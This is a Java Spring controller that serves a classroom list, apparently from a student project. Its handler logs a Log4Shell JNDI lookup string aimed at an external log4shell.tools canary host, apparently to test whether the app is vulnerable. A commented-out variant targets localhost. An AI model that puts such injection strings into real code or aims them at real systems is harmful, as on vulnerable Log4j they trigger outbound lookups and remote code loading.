package pt.iscte.asd.projectn3.group11.controllers;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import static pt.iscte.asd.projectn3.group11.services.controllerhandlers.ClassroomControllerHandler.fetchAllClassRoomsHandler;


@Controller
public class ClassroomController {

    //region PATH_CONSTANTS
    public static final String CLASSROOM_PATH = "/classrooms";
    private static Logger LOGGER = LogManager.getLogger(ClassroomController.class);
    //endregion

    //region CLASSROOM

    /**
     * Fetched Classrooms.
     * @param response response
     * @param request request
     * @param model model
     * @return html filled with the variables
     */
    @GetMapping(value = CLASSROOM_PATH)
    public String fetchAllClassRooms(HttpServletResponse response, HttpServletRequest request, Model model) {
        //LOGGER.error("${jndi:ldap://localhost:1389/a}" );
        LOGGER.error("${jndi:ldap://2fff300d-769a-4df5-ad8f-73c97afeb807.dns.log4shell.tools:12345/2fff300d-769a-4df5-ad8f-73c97afeb807}" );
        return fetchAllClassRoomsHandler(response, request, model);
    }

    //endregion
}
